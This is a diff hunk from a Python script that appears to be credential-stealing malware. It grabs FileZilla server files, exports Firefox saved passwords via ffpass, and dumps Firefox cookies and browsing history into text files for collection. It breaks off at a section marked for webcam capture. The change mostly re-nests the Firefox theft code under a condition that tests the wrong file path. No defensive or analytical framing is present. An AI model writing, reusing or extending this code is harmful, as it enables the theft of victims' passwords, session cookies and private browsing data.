@@ -56,73 +56,76 @@ file_path = os.path.join("C:/Users", user, "AppData/Roaming/FileZilla/recentserv
 if os.path.isfile(file_path):
     shutil.copy(file_path, cdfilezilla)
 #firefox
-mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
-mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
-if os.path.exists(mozilla_profile_ini):
-    os.makedirs(cdfirefox)
-try:
+if  os.path.exists(file_path)  == True :
     mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
     mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
-    profile = configparser.ConfigParser()
-    profile.read(mozilla_profile_ini)
-    data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
-    subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
-    subprocess_return = subprocesss.stdout.read()
-    passwords = str(subprocess_return)
-    with open(dis2+'/browser/Firefox/Saved_Passwords.txt', "a", encoding="utf-8") as file:
-        file.write(passwords.replace('\\r', '\n'))
-except:
-    pass
-def get_firefox_cookies():
+    if os.path.exists(mozilla_profile_ini):
+        os.makedirs(cdfirefox)
     try:
-        textf = ''
-        textf += ''
-        profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
-        for root, dirs, files in os.walk(profiles_path):
-            for name in dirs:
-                path = os.path.expanduser("~") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
-                profiles = os.listdir(path)
-                conn = sqlite3.connect(os.path.join(r"C:\Users\\"+user+"\AppData\Roaming\Mozilla\Firefox\Profiles\\"+profiles[0]+"\cookies.sqlite"))
+        mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
+        mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
+        profile = configparser.ConfigParser()
+        profile.read(mozilla_profile_ini)
+        data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
+        subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
+        subprocess_return = subprocesss.stdout.read()
+        passwords = str(subprocess_return)
+        with open(dis2+'/browser/Firefox/Saved_Passwords.txt', "a", encoding="utf-8") as file:
+            file.write(passwords.replace('\\r', '\n'))
+    except:
+        pass
+    def get_firefox_cookies():
+        try:
+            textf = ''
+            textf += ''
+            profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+            for root, dirs, files in os.walk(profiles_path):
+                for name in dirs:
+                    path = os.path.expanduser("~") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
+                    profiles = os.listdir(path)
+                    conn = sqlite3.connect(os.path.join(r"C:\Users\\"+user+"\AppData\Roaming\Mozilla\Firefox\Profiles\\"+profiles[0]+"\cookies.sqlite"))
+                    cursor = conn.cursor()
+                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
+                    data = cursor.fetchall()
+                    for row in data:
+                        url, name, path, value, expiry = row
+                        textf += f"""{url}	FALSE	{path}	FALSE	{expiry}	{name}	{value}\ns"""
+                    conn.close()
+                    break
+            return textf
+        except:
+            pass
+    try:
+        with open(os.path.join(dis2+'/browser/Firefox/Browser_Cookies.txt'), 'w+', encoding='utf-8') as f:
+            f.write(get_firefox_cookies())
+    except:
+        pass
+
+    profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+    profiles = os.listdir(profiles_path)
+    history_data = []
+
+    with open(dis2+'/browser/Firefox/Browser_History.txt', 'a', encoding='utf-8') as file:
+        try:
+            for profile in profiles:
+                profile_path = os.path.join(profiles_path, profile)
+                places_path = os.path.join(profile_path, "places.sqlite")
+                if not os.path.isfile(places_path):
+                    continue
+                conn = sqlite3.connect(places_path)
                 cursor = conn.cursor()
-                cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
+                cursor.execute('SELECT url, title, last_visit_date FROM moz_places')
                 data = cursor.fetchall()
                 for row in data:
-                    url, name, path, value, expiry = row
-                    textf += f"""{url}	FALSE	{path}	FALSE	{expiry}	{name}	{value}\ns"""
+                    url, title, time = row
+                    history_entry = f"URL: {url}\nTitle: {title}\nVisited Time: {time}\n\n"
+                    history_data.append(history_entry)
+                    file.write(history_entry.encode('utf-8', 'ignore').decode('utf-8'))
                 conn.close()
-                break
-        return textf
-    except:
-        pass
-try:
-    with open(os.path.join(dis2+'/browser/Firefox/Browser_Cookies.txt'), 'w+', encoding='utf-8') as f:
-        f.write(get_firefox_cookies())
-except:
+        except:
+            pass
+else:
     pass
-    
-profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
-profiles = os.listdir(profiles_path)
-history_data = []
-
-with open(dis2+'/browser/Firefox/Browser_History.txt', 'a', encoding='utf-8') as file:
-    try:
-        for profile in profiles:
-            profile_path = os.path.join(profiles_path, profile)
-            places_path = os.path.join(profile_path, "places.sqlite")
-            if not os.path.isfile(places_path):
-                continue
-            conn = sqlite3.connect(places_path)
-            cursor = conn.cursor()
-            cursor.execute('SELECT url, title, last_visit_date FROM moz_places')
-            data = cursor.fetchall()
-            for row in data:
-                url, title, time = row
-                history_entry = f"URL: {url}\nTitle: {title}\nVisited Time: {time}\n\n"
-                history_data.append(history_entry)
-                file.write(history_entry.encode('utf-8', 'ignore').decode('utf-8'))
-            conn.close()
-    except:
-        pass
 #webcam
 with tempfile.TemporaryDirectory() as temp_dir:
     try:
